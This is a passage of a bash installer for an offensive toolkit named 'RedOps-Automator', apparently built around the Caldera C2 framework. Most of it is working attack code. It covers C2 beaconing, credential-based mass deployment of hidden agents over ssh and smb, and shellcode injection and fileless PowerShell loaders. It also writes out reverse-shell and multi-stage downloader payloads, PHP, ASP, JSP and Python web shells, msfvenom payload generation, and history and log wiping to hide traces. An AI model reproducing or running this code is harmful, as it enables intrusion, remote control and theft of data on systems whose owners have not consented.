    log_action "INFO" "Starting automated beacon loop..."
    local sleep_interval=$(jq -r '.sleep' "$AGENT_PROFILE")
    local paw_id=$(jq -r '.paw' "$AGENT_PROFILE")
    
    while true; do
        if enhanced_beacon_to_c2; then
            log_action "SUCCESS" "Beacon successful for PAW $paw_id"
        else
            log_action "WARNING" "Beacon failed, retrying in 30s..."
            sleep 30
            continue
        fi
        
        sleep "$sleep_interval"
    done
}

# Multi-target deployment
function multi_target_deployment() {
    echo -e "${CYAN}[*] Multi-target deployment setup...${NC}"
    
    read -p "Enter target list file (IP per line): " target_file
    if [[ ! -f "$target_file" ]]; then
        log_action "ERROR" "Target file not found: $target_file"
        return 1
    fi
    
    read -p "Deployment method (ssh/http/smb): " deploy_method
    read -p "Credentials file (user:pass per line): " creds_file
    
    local deployment_script="$HOME/redops_payloads/multi_deploy.sh"
    
    cat > "$deployment_script" << EOF
#!/bin/bash
# Multi-target deployment script
TARGET_FILE="$target_file"
CREDS_FILE="$creds_file"
AGENT_PATH="$OUTPUT_DIR/$(jq -r '.exe_name' "$AGENT_PROFILE")"

while IFS= read -r target; do
    echo "Deploying to \$target..."
    case "$deploy_method" in
        "ssh")
            while IFS=':' read -r user pass; do
                sshpass -p "\$pass" scp "\$AGENT_PATH" "\$user@\$target:/tmp/.update"
                sshpass -p "\$pass" ssh "\$user@\$target" "chmod +x /tmp/.update && nohup /tmp/.update &"
            done < "\$CREDS_FILE"
            ;;
        "http")
            # HTTP deployment logic
            python3 -m http.server 8080 &
            SERVER_PID=\$!
            curl -X POST "http://\$target/deploy" -F "file=@\$AGENT_PATH"
            kill \$SERVER_PID
            ;;
        "smb")
            # SMB deployment logic
            while IFS=':' read -r user pass; do
                smbclient "//\$target/C\$" -U "\$user%\$pass" -c "put \$AGENT_PATH temp\\update.exe"
            done < "\$CREDS_FILE"
            ;;
    esac
done < "\$TARGET_FILE"
EOF
    
    chmod +x "$deployment_script"
    log_action "SUCCESS" "Multi-target deployment script created: $deployment_script"
}

# Advanced payload generation
function generate_advanced_payloads() {
    echo -e "${CYAN}[*] Generating advanced payloads...${NC}"
    
    local payload_dir="$HOME/redops_payloads/advanced"
    mkdir -p "$payload_dir"
    
    echo "Select payload type:"
    echo "1. Reflective DLL"
    echo "2. Shellcode injector"
    echo "3. Memory-only payload"
    echo "4. Fileless PowerShell"
    echo "5. Python backdoor"
    echo "6. All payloads"
    read -p "Choice: " payload_choice
    
    case $payload_choice in
        1|6)
            # Reflective DLL template
            cat > "$payload_dir/reflective_dll.c" << 'EOF'
// Reflective DLL Injection Template
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Payload execution code here
            break;
    }
    return TRUE;
}

// Reflective loader function
__declspec(dllexport) VOID ReflectiveLoader(VOID) {
    // Load and execute payload in memory
}
EOF
            log_action "SUCCESS" "Reflective DLL template created"
            ;;
    esac
    
    case $payload_choice in
        2|6)
            # Shellcode injector
            cat > "$payload_dir/shellcode_injector.py" << 'EOF'
#!/usr/bin/env python3
import ctypes
import ctypes.wintypes
import sys

def inject_shellcode(pid, shellcode):
    """Inject shellcode into target process"""
    kernel32 = ctypes.windll.kernel32
    
    # Open target process
    process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not process_handle:
        return False
    
    # Allocate memory
    memory_address = kernel32.VirtualAllocEx(
        process_handle, 0, len(shellcode), 0x3000, 0x40
    )
    
    # Write shellcode
    kernel32.WriteProcessMemory(
        process_handle, memory_address, shellcode, len(shellcode), None
    )
    
    # Create remote thread
    thread_handle = kernel32.CreateRemoteThread(
        process_handle, None, 0, memory_address, None, 0, None
    )
    
    return thread_handle is not None

if __name__ == "__main__":
    # Example usage
    shellcode = b"\x90" * 100  # Replace with actual shellcode
    inject_shellcode(int(sys.argv[1]), shellcode)
EOF
            log_action "SUCCESS" "Shellcode injector created"
            ;;
    esac
    
    case $payload_choice in
        4|6)
            # Fileless PowerShell
            cat > "$payload_dir/fileless_powershell.ps1" << 'EOF'
# Fileless PowerShell Payload
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $code

# Shellcode (replace with actual payload)
$shellcode = [Byte[]] @(0x90,0x90,0x90,0x90)

# Allocate memory and execute
$address = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $address, $shellcode.Length)
$thread = [Win32]::CreateThread(0, 0, $address, 0, 0, 0)
EOF
            log_action "SUCCESS" "Fileless PowerShell payload created"
            ;;
    esac
    
    case $payload_choice in
        5|6)
            # Python backdoor
            cat > "$payload_dir/python_backdoor.py" << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import threading
import time
import base64
import os

class PythonBackdoor:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
    
    def connect(self):
        while not self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                self.running = True
                self.handle_commands()
            except:
                time.sleep(10)
    
    def handle_commands(self):
        while self.running:
            try:
                command = self.socket.recv(1024).decode()
                if command.startswith('cd '):
                    os.chdir(command[3:])
                    self.socket.send(b'Changed directory\n')
                elif command == 'exit':
                    break
                else:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    self.socket.send(output.encode())
            except:
                break
        
        self.socket.close()
        self.running = False

if __name__ == "__main__":
    backdoor = PythonBackdoor("127.0.0.1", 4444)
    backdoor.connect()
EOF
            log_action "SUCCESS" "Python backdoor created"
            ;;
    esac
}

# Main menu system
function main_menu() {
    while true; do
        echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${BLUE}                    RedOps-Automator v4.0 Menu                    ${NC}"
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}Agent Management:${NC}"
        echo -e "  1.  Create Enhanced Agent Profile"
        echo -e "  2.  Build Multi-Platform Agents"
        echo -e "  3.  Generate Delivery Methods"
        echo -e "${GREEN}Communication:${NC}"
        echo -e "  4.  Enhanced Beacon to C2"
        echo -e "  5.  Execute Instructions"
        echo -e "  6.  Start Automated Beacon Loop"
        echo -e "${GREEN}Deployment:${NC}"
        echo -e "  7.  Install Persistence"
        echo -e "  8.  Multi-Target Deployment"
        echo -e "  9.  Automated Full Deployment"
        echo -e "${GREEN}Advanced Features:${NC}"
        echo -e "  10. Apply Evasion Techniques"
        echo -e "  11. Generate Advanced Payloads"
        echo -e "  12. File Upload/Download"
        echo -e "${GREEN}Utilities:${NC}"
        echo -e "  13. View Agent Status"
        echo -e "  14. Clean Artifacts"
        echo -e "  15. Debug Mode Toggle"
        echo -e "  16. Exit"
        echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-16]: ${NC}"
        read choice
        
        case $choice in
            1) create_enhanced_agent_profile ;;
            2) build_enhanced_agents ;;
            3) 
                local platform=$(jq -r '.platform' "$AGENT_PROFILE" 2>/dev/null || echo "linux")
                local filename=$(jq -r '.exe_name' "$AGENT_PROFILE" 2>/dev/null || echo "agent")
                generate_delivery_methods "$platform" "$filename" "1024000"
                ;;
            4) enhanced_beacon_to_c2 ;;
            5) 
                read -p "Enter instructions JSON: " instructions
                enhanced_execute_instructions "$instructions"
                ;;
            6) automated_deployment ;;
            7) install_persistence ;;
            8) multi_target_deployment ;;
            9) automated_deployment ;;
            10) apply_evasion_techniques ;;
            11) generate_advanced_payloads ;;
            12) 
                echo "1. Upload file to C2"
                echo "2. Download file from C2"
                read -p "Choice: " file_choice
                if [[ "$file_choice" == "1" ]]; then
                    read -p "File to upload: " upload_file
                    if [[ -f "$upload_file" ]]; then
                        local server=$(jq -r '.server' "$AGENT_PROFILE")
                        curl -s -X POST -F "file=@$upload_file" "$server/file/upload"
                        log_action "SUCCESS" "File uploaded: $upload_file"
                    fi
                elif [[ "$file_choice" == "2" ]]; then
                    read -p "File to download: " download_file
                    local server=$(jq -r '.server' "$AGENT_PROFILE")
                    curl -s -X POST -H "file:$download_file" "$server/file/download" > "$download_file"
                    log_action "SUCCESS" "File downloaded: $download_file"
                fi
                ;;
            13) 
                if [[ -f "$AGENT_PROFILE" ]]; then
                    echo -e "${GREEN}Agent Status:${NC}"
                    echo "PAW ID: $(jq -r '.paw' "$AGENT_PROFILE")"
                    echo "Platform: $(jq -r '.platform' "$AGENT_PROFILE")/$(jq -r '.architecture' "$AGENT_PROFILE")"
                    echo "Server: $(jq -r '.server' "$AGENT_PROFILE")"
                    echo "Sleep: $(jq -r '.sleep' "$AGENT_PROFILE")s"
                    echo "Created: $(jq -r '.created' "$AGENT_PROFILE")"
                else
                    echo -e "${RED}No agent profile found${NC}"
                fi
                ;;
            14) 
                log_action "INFO" "Cleaning artifacts..."
                rm -rf /tmp/redops_* /tmp/agent_* /tmp/beacon_* /tmp/instructions.json 2>/dev/null
                history -c
                log_action "SUCCESS" "Artifacts cleaned"
                ;;
            15) 
                if [[ "$DEBUG_MODE" == "true" ]]; then
                    DEBUG_MODE=false
                    log_action "INFO" "Debug mode disabled"
                else
                    DEBUG_MODE=true
                    log_action "INFO" "Debug mode enabled"
                fi
                ;;
            16) 
                log_action "INFO" "Exiting RedOps-Automator..."
                exit 0
                ;;
            *) 
                log_action "ERROR" "Invalid choice. Please enter a number between 1 and 16."
                ;;
        esac
        
        echo -e "\n${YELLOW}Press Enter to continue...${NC}"
        read
    done
}

# Script initialization
function init_redops() {
    banner
    check_dependencies
    
    log_action "SUCCESS" "RedOps-Automator v4.0 initialized successfully"
    log_action "INFO" "Output directory: $OUTPUT_DIR"
    log_action "INFO" "Custom agents directory: $CUSTOM_AGENT_DIR"
    log_action "INFO" "Logs directory: $HOME/redops_logs"
    
    # Check if Caldera is running
    if curl -s "$C2_HOST/api/v2/health" &>/dev/null; then
        log_action "SUCCESS" "Caldera C2 server detected at $C2_HOST"
    else
        log_action "WARNING" "Caldera C2 server not detected. Make sure it's running at $C2_HOST"
    fi
    
    main_menu
}

# Signal handlers
trap 'log_action "WARNING" "Script interrupted by user"; exit 1' INT TERM

# Start the enhanced RedOps-Automator
init_redops
EOF
    
    chmod +x "$redops_script"
    log "SUCCESS" "RedOps-Automator Enhanced installed at $redops_script"
}

# Add RedOps to utility tools menu
show_utility_tools_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                            UTILITY TOOLS                                    ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install DNS Changer Eye${NC}"
        echo -e "2.  ${BLUE}Run DNS Changer Eye${NC}"
        echo -e "3.  ${BLUE}Install ClearTracks Anti-Forensics${NC}"
        echo -e "4.  ${BLUE}Run ClearTracks (Standard)${NC}"
        echo -e "5.  ${BLUE}Run ClearTracks (Paranoid Mode)${NC}"
        echo -e "6.  ${BLUE}Run ClearTracks (Selective Mode)${NC}"
        echo -e "7.  ${BLUE}Install RedOps-Automator${NC}"
        echo -e "8.  ${BLUE}Run RedOps-Automator${NC}"
        echo -e "9.  ${BLUE}System Hardening Tools${NC}"
        echo -e "10. ${BLUE}Network Tools${NC}"
        echo -e "11. ${BLUE}Forensics Tools${NC}"
        echo -e "12. ${BLUE}Advanced Payload Generator${NC}"
        echo -e "13. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-13]: ${NC}"
        read utility_choice
        
        case $utility_choice in
            1) 
                install_dns_changer
                read -p "Press Enter to continue..."
                ;;
            2) 
                if [[ -f "$TOOLS_DIR/dns_changer_eye.py" ]]; then
                    python3 "$TOOLS_DIR/dns_changer_eye.py"
                else
                    log "ERROR" "DNS Changer Eye not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            3) 
                install_cleartracks
                read -p "Press Enter to continue..."
                ;;
            4) 
                if [[ -f "$TOOLS_DIR/cleartracks.sh" ]]; then
                    echo -e "${RED}WARNING: This will clear system logs and traces!${NC}"
                    read -p "Continue? (y/N): " confirm
                    if [[ "$confirm" =~ [yY] ]]; then
                        sudo "$TOOLS_DIR/cleartracks.sh"
                    fi
                else
                    log "ERROR" "ClearTracks not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                if [[ -f "$TOOLS_DIR/cleartracks.sh" ]]; then
                    echo -e "${RED}WARNING: Paranoid mode will overwrite free disk space!${NC}"
                    read -p "Continue? (y/N): " confirm
                    if [[ "$confirm" =~ [yY] ]]; then
                        sudo "$TOOLS_DIR/cleartracks.sh" --paranoid
                    fi
                else
                    log "ERROR" "ClearTracks not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            6) 
                if [[ -f "$TOOLS_DIR/cleartracks.sh" ]]; then
                    sudo "$TOOLS_DIR/cleartracks.sh" --selective
                else
                    log "ERROR" "ClearTracks not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            7) 
                install_redops_automator
                read -p "Press Enter to continue..."
                ;;
            8) 
                if [[ -f "$TOOLS_DIR/redops_automator.sh" ]]; then
                    bash "$TOOLS_DIR/redops_automator.sh"
                else
                    log "ERROR" "RedOps-Automator not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            9) 
                show_hardening_tools
                ;;
            10) 
                show_network_tools
                ;;
            11) 
                show_forensics_tools
                ;;
            12) 
                show_payload_generator
                ;;
            13) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 13."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_payload_generator() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                        ADVANCED PAYLOAD GENERATOR                           ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${BLUE}Select payload type:${NC}"
    echo "1. Reverse Shell Payloads"
    echo "2. Bind Shell Payloads"
    echo "3. Meterpreter Payloads"
    echo "4. Custom Shellcode"
    echo "5. Web Shells"
    echo "6. PowerShell Payloads"
    echo "7. Python Payloads"
    echo "8. Multi-Stage Payloads"
    echo "9. Back to utilities menu"
    
    read -p "Choice: " payload_choice
    
    case $payload_choice in
        1) 
            echo -e "${CYAN}Reverse Shell Payload Generator:${NC}"
            read -p "Enter LHOST: " lhost
            read -p "Enter LPORT: " lport
            read -p "Select format (exe/elf/macho/raw): " format
            
            local payload_file="$TOOLS_DIR/reverse_shell_${lhost}_${lport}.${format}"
            
            case $format in
                "exe")
                    msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o "$payload_file"
                    ;;
                "elf")
                    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o "$payload_file"
                    ;;
                "macho")
                    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o "$payload_file"
                    ;;
                "raw")
                    msfvenom -p generic/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o "$payload_file"
                    ;;
            esac
            
            if [[ -f "$payload_file" ]]; then
                log "SUCCESS" "Reverse shell payload created: $payload_file"
                echo "File size: $(ls -lh "$payload_file" | awk '{print $5}')"
                echo "MD5: $(md5sum "$payload_file" | cut -d' ' -f1)"
            fi
            ;;
            
        2) 
            echo -e "${CYAN}Bind Shell Payload Generator:${NC}"
            read -p "Enter LPORT: " lport
            read -p "Select format (exe/elf/macho): " format
            
            local payload_file="$TOOLS_DIR/bind_shell_${lport}.${format}"
            
            case $format in
                "exe")
                    msfvenom -p windows/shell_bind_tcp LPORT=$lport -f exe -o "$payload_file"
                    ;;
                "elf")
                    msfvenom -p linux/x86/shell_bind_tcp LPORT=$lport -f elf -o "$payload_file"
                    ;;
                "macho")
                    msfvenom -p osx/x86/shell_bind_tcp LPORT=$lport -f macho -o "$payload_file"
                    ;;
            esac
            
            if [[ -f "$payload_file" ]]; then
                log "SUCCESS" "Bind shell payload created: $payload_file"
            fi
            ;;
            
        3) 
            echo -e "${CYAN}Meterpreter Payload Generator:${NC}"
            read -p "Enter LHOST: " lhost
            read -p "Enter LPORT: " lport
            read -p "Select platform (windows/linux/osx/android): " platform
            
            local payload_file="$TOOLS_DIR/meterpreter_${platform}_${lhost}_${lport}"
            
            case $platform in
                "windows")
                    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o "${payload_file}.exe"
                    ;;
                "linux")
                    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o "${payload_file}.elf"
                    ;;
                "osx")
                    msfvenom -p osx/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o "${payload_file}.macho"
                    ;;
                "android")
                    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o "${payload_file}.apk"
                    ;;
            esac
            
            log "SUCCESS" "Meterpreter payload created for $platform"
            ;;
            
        4) 
            echo -e "${CYAN}Custom Shellcode Generator:${NC}"
            echo "1. Execute command"
            echo "2. Add user"
            echo "3. Download and execute"
            echo "4. Custom assembly"
            read -p "Shellcode type: " shellcode_type
            
            case $shellcode_type in
                1)
                    read -p "Enter command to execute: " command
                    msfvenom -p linux/x86/exec CMD="$command" -f python
                    ;;
                2)
                    read -p "Enter username: " username
                    read -p "Enter password: " password
                    msfvenom -p linux/x86/adduser USER="$username" PASS="$password" -f python
                    ;;
                3)
                    read -p "Enter URL: " url
                    msfvenom -p linux/x86/download_exec URL="$url" -f python
                    ;;
                4)
                    echo "Enter custom assembly code (end with EOF):"
                    cat > /tmp/custom_asm.asm
                    nasm -f elf32 /tmp/custom_asm.asm -o /tmp/custom_asm.o
                    objdump -D /tmp/custom_asm.o
                    ;;
            esac
            ;;
            
        5) 
            echo -e "${CYAN}Web Shell Generator:${NC}"
            echo "1. PHP Web Shell"
            echo "2. ASP Web Shell"
            echo "3. JSP Web Shell"
            echo "4. Python Web Shell"
            read -p "Web shell type: " webshell_type
            
            case $webshell_type in
                1)
                    cat > "$TOOLS_DIR/webshell.php" << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        passthru($cmd);
    }
}
?>
EOF
                    log "SUCCESS" "PHP web shell created: $TOOLS_DIR/webshell.php"
                    ;;
                2)
                    cat > "$TOOLS_DIR/webshell.asp" << 'EOF'
<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(cmd)
    Response.Write("<pre>")
    Response.Write(objExec.StdOut.ReadAll())
    Response.Write("</pre>")
End If
%>
EOF
                    log "SUCCESS" "ASP web shell created: $TOOLS_DIR/webshell.asp"
                    ;;
                3)
                    cat > "$TOOLS_DIR/webshell.jsp" << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process proc = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
}
%>
EOF
                    log "SUCCESS" "JSP web shell created: $TOOLS_DIR/webshell.jsp"
                    ;;
                4)
                    cat > "$TOOLS_DIR/webshell.py" << 'EOF'
#!/usr/bin/env python3
import cgi
import subprocess
import sys

print("Content-Type: text/html\n")

form = cgi.FieldStorage()
cmd = form.getvalue("cmd")

if cmd:
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(f"<pre>{result.stdout}</pre>")
        if result.stderr:
            print(f"<pre style='color:red'>{result.stderr}</pre>")
    except Exception as e:
        print(f"<pre style='color:red'>Error: {e}</pre>")
else:
    print('<form method="get"><input name="cmd" placeholder="Enter command"><input type="submit" value="Execute"></form>')
EOF
                    log "SUCCESS" "Python web shell created: $TOOLS_DIR/webshell.py"
                    ;;
            esac
            ;;
            
        6) 
            echo -e "${CYAN}PowerShell Payload Generator:${NC}"
            read -p "Enter LHOST: " lhost
            read -p "Enter LPORT: " lport
            
            cat > "$TOOLS_DIR/powershell_payload.ps1" << EOF
\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport)
\$stream = \$client.GetStream()
[byte[]]\$bytes = 0..65535|%{0}
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i)
    \$sendback = (iex \$data 2>&1 | Out-String )
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2)
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length)
    \$stream.Flush()
}
\$client.Close()
EOF
            
            # Create encoded version
            local encoded=$(cat "$TOOLS_DIR/powershell_payload.ps1" | iconv -t utf-16le | base64 -w 0)
            echo "powershell -EncodedCommand $encoded" > "$TOOLS_DIR/powershell_encoded.txt"
            
            log "SUCCESS" "PowerShell payloads created"
            log "INFO" "Standard: $TOOLS_DIR/powershell_payload.ps1"
            log "INFO" "Encoded: $TOOLS_DIR/powershell_encoded.txt"
            ;;
            
        7) 
            echo -e "${CYAN}Python Payload Generator:${NC}"
            read -p "Enter LHOST: " lhost
            read -p "Enter LPORT: " lport
            
            cat > "$TOOLS_DIR/python_payload.py" << EOF
#!/usr/bin/env python3
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('$lhost', $lport))

while True:
    data = s.recv(1024).decode()
    if data.strip().lower() == 'exit':
        break
    if data.startswith('cd '):
        try:
            os.chdir(data[3:].strip())
            s.send('Changed directory\\n'.encode())
        except:
            s.send('Directory not found\\n'.encode())
    else:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        s.send(output + error)

s.close()
EOF
            
            log "SUCCESS" "Python payload created: $TOOLS_DIR/python_payload.py"
            ;;
            
        8) 
            echo -e "${CYAN}Multi-Stage Payload Generator:${NC}"
            read -p "Enter LHOST: " lhost
            read -p "Enter LPORT: " lport
            read -p "Enter staging port: " stage_port
            
            # Stage 1: Downloader
            cat > "$TOOLS_DIR/stage1_downloader.py" << EOF
#!/usr/bin/env python3
import urllib.request
import tempfile
import os
import subprocess

# Download stage 2
stage2_url = 'http://$lhost:$stage_port/stage2.py'
temp_file = os.path.join(tempfile.gettempdir(), 'update.py')

try:
    urllib.request.urlretrieve(stage2_url, temp_file)
    subprocess.Popen(['python3', temp_file])
except Exception as e:
    pass
EOF
            
            # Stage 2: Full payload
            cat > "$TOOLS_DIR/stage2.py" << EOF
#!/usr/bin/env python3
import socket
import subprocess
import threading
import time

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('$lhost', $lport))
    
    while True:
        data = s.recv(1024).decode()
        if not data:
            break
        
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        s.send(output + error)
    
    s.close()

# Start reverse shell in background
threading.Thread(target=reverse_shell, daemon=True).start()

# Keep alive
while True:
    time.sleep(60)
EOF
            
            log "SUCCESS" "Multi-stage payload created"
            log "INFO" "Stage 1: $TOOLS_DIR/stage1_downloader.py"
            log "INFO" "Stage 2: $TOOLS_DIR/stage2.py"
            log "INFO" "Host stage2.py on http://$lhost:$stage_port/stage2.py"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}# ============================================================================
#                         REDOPS CALDERA AGENT BUILDER
# ============================================================================

install_redops_automator() {
    log "INFO" "Installing RedOps-Automator Enhanced Agent Builder..."
    
    local redops_script="$TOOLS_DIR/redops_automator.sh"
    
    cat > "$redops_script" << 'EOF'
#!/bin/bash
# RedOps-Automator v4.0 - Enhanced
# Full Caldera Agent Builder & Stealth Delivery Framework
# Original Author: Kdairatchi x GPT
# Enhanced for Ultimate Red Team Automation

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Global Variables
AGENT_DIR="$HOME/caldera/plugins/sandcat/gocat"
OUTPUT_DIR="$HOME/caldera/plugins/sandcat/payloads"
CUSTOM_AGENT_DIR="$HOME/redops_agents"
C2_HOST="http://127.0.0.1:8888"
CONTACTS=("http" "tcp" "udp" "websocket" "gist" "dns" "slack" "telegram")
AGENT_PROFILE="$HOME/agent_profile.json"
WATCHDOG=0
CURRENT_DIR=$(pwd)
DEBUG_MODE=false
AUTO_MODE=false
STEALTH_MODE=false

# Create directories
mkdir -p "$OUTPUT_DIR" "$CUSTOM_AGENT_DIR" "$HOME/redops_logs" "$HOME/redops_payloads"

function banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
██████╗ ███████╗██████╗  ██████╗ ██████╗ ███████╗    ██╗   ██╗██╗  ██╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝    ██║   ██║██║  ██║
██████╔╝█████╗  ██║  ██║██║   ██║██████╔╝███████╗    ██║   ██║███████║
██╔══██╗██╔══╝  ██║  ██║██║   ██║██╔═══╝ ╚════██║    ╚██╗ ██╔╝╚════██║
██║  ██║███████╗██████╔╝╚██████╔╝██║     ███████║     ╚████╔╝      ██║
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚═╝     ╚══════╝      ╚═══╝       ╚═╝

Enhanced Caldera Agent Builder & Stealth Delivery Framework v4.0
EOF
    echo -e "${NC}"
    echo -e "${PURPLE}[*] Enhanced Features: Multi-Platform, Stealth Delivery, Discord Integration${NC}"
    echo -e "${PURPLE}[*] Supported Platforms: Windows, Linux, macOS, Android, IoT${NC}"
    echo
}

# Pre-check for dependencies
function check_dependencies() {
    local missing=0
    local deps=("go" "curl" "jq" "base64")
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[!] $dep is not installed${NC}"
            missing=$((missing + 1))
        fi
    done
    
    if ! command -v upx &> /dev/null; then
        echo -e "${YELLOW}[!] UPX not installed. Packing will be skipped.${NC}"
        PACKER=false
    else
        PACKER=true
    fi
    
    if [[ $missing -gt 0 ]]; then
        echo -e "${RED}[!] Please install missing dependencies and retry.${NC}"
        exit 1
    fi
}

function log_action() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_file="$HOME/redops_logs/redops.log"
    
    echo "[$timestamp] [$level] $message" >> "$log_file"
    
    if [[ "$DEBUG_MODE" == "true" ]] || [[ "$level" != "DEBUG" ]]; then
        case $level in
            "ERROR") echo -e "${RED}[!] $message${NC}" ;;
            "SUCCESS") echo -e "${GREEN}[+] $message${NC}" ;;
            "INFO") echo -e "${BLUE}[*] $message${NC}" ;;
            "WARNING") echo -e "${YELLOW}[!] $message${NC}" ;;
            *) echo -e "${WHITE}[*] $message${NC}" ;;
        esac
    fi
}

# Enhanced Discord integration with rich embeds
function discord_rich_embed() {
    local webhook_url="$1"
    local title="$2"
    local description="$3"
    local color="$4"
    local fields="$5"
    local thumbnail="$6"
    local file_path="$7"
    
    local embed_json="{
        \"username\": \"RedOps Command Center\",
        \"embeds\": [{
            \"title\": \"$title\",
            \"description\": \"$description\",
            \"color\": $color,
            \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",
            \"footer\": {\"text\": \"RedOps-Automator v4.0\"},
            \"fields\": $fields"
    
    [[ -n "$thumbnail" ]] && embed_json="${embed_json},\"thumbnail\": {\"url\": \"$thumbnail\"}"
    embed_json="${embed_json}]}}"
    
    if [[ -n "$file_path" ]] && [[ -f "$file_path" ]]; then
        curl -s -F "payload_json=$embed_json" -F "file=@$file_path" "$webhook_url"
    else
        curl -s -X POST "$webhook_url" -H "Content-Type: application/json" -d "$embed_json"
    fi
}

function discord_agent_deployed() {
    local webhook_url="$1"
    local platform="$2"
    local filename="$3"
    local size="$4"
    local hash="$5"
    
    local fields="[
        {\"name\":\"Platform\",\"value\":\"$platform\",\"inline\":true},
        {\"name\":\"Filename\",\"value\":\"$filename\",\"inline\":true},
        {\"name\":\"Size\",\"value\":\"$size\",\"inline\":true},
        {\"name\":\"SHA256\",\"value\":\"$hash\",\"inline\":false}
    ]"
    
    discord_rich_embed "$webhook_url" "🚀 Agent Deployed" "New Caldera agent successfully built and deployed" "65280" "$fields"
}

function discord_beacon_callback() {
    local webhook_url="$1"
    local paw="$2"
    local platform="$3"
    local ip="$4"
    local user="$5"
    local privilege="$6"
    
    local fields="[
        {\"name\":\"PAW ID\",\"value\":\"$paw\",\"inline\":true},
        {\"name\":\"Platform\",\"value\":\"$platform\",\"inline\":true},
        {\"name\":\"IP Address\",\"value\":\"$ip\",\"inline\":true},
